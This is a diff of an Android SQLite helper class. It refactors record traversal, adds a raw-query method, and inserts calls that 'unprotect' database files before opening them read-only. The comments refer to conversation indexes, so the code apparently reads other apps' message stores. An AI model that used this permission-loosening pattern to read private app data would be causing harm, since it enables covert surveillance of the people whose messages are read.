@@ -31,7 +31,7 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	public static Object lockObject = new Object();
 	private String name = null;
 	private SQLiteDatabase db;
-	private boolean deleteAtEnd = false;
+	public boolean deleteAtEnd = false;
 
 	private GenericSqliteHelper(String name, boolean deleteAtEnd) {
 		this.name = name;
@@ -122,6 +122,24 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	 * oldVersion); } }
 	 */
 
+	public long traverseRawQuery(String sqlquery, String[] selectionArgs, RecordVisitor visitor) {
+		synchronized (lockObject) {
+			db = getReadableDatabase();
+			Cursor cursor = db.rawQuery(sqlquery, selectionArgs);
+			
+			long ret = traverse(cursor, visitor, new String[] {  });
+			
+			cursor.close();
+			cursor = null;
+
+			if (this.db != null) {
+				db.close();
+				db = null;
+			}
+			return ret;
+		}
+	}
+
 	/**
 	 * Traverse all the records of a table on a projection. Visitor pattern
 	 * implementation
@@ -133,31 +151,15 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 	 */
 	public long traverseRecords(String table, RecordVisitor visitor) {
 		synchronized (lockObject) {
-			SQLiteDatabase db = getReadableDatabase();
+			db = getReadableDatabase();
 			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 
 			queryBuilderIndex.setTables(table);
-
 			Cursor cursor = queryBuilderIndex.query(db, visitor.getProjection(), visitor.getSelection(), null, null,
 					null, visitor.getOrder());
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (traverseRecords)");
-			}
-			visitor.init(table, cursor.getCount());
+			long ret = traverse(cursor, visitor, new String[] { table });
 
-			long maxid = 0;
-			// iterate conversation indexes
-			while (cursor != null && cursor.moveToNext() && !visitor.isStopRequested()) {
-				long id = visitor.cursor(cursor);
-				maxid = Math.max(id, maxid);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (traverseRecords) maxid: " + maxid);
-			}
-
-			visitor.close();
 			cursor.close();
 			cursor = null;
 
@@ -165,14 +167,37 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 				db.close();
 				db = null;
 			}
-
-			if (this.deleteAtEnd) {
-				File file = new File(this.name);
-				file.delete();
-			}
-
-			return maxid;
+			return ret;
 		}
+	}
+
+	private long traverse(Cursor cursor, RecordVisitor visitor, String[] tables) {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (traverseRecords)");
+		}
+		visitor.init(tables, cursor.getCount());
+
+		long maxid = 0;
+		// iterate conversation indexes
+		while (cursor != null && cursor.moveToNext() && !visitor.isStopRequested()) {
+			long id = visitor.cursor(cursor);
+			maxid = Math.max(id, maxid);
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (traverseRecords) maxid: " + maxid);
+		}
+
+		visitor.close();
+
+		if (this.deleteAtEnd) {
+			File file = new File(this.name);
+			file.delete();
+		}
+
+		return maxid;
+
 	}
 
 	public SQLiteDatabase getReadableDatabase() {
@@ -180,8 +205,11 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			return db;
 		}
 		try {
+			Path.unprotect(name, 3, true);
+			Path.unprotect(name + "*", true);
+			
 			SQLiteDatabase opened = SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
-						| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
+					| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
 			return opened;
 		} catch (Throwable ex) {
 			if (Cfg.DEBUG) {
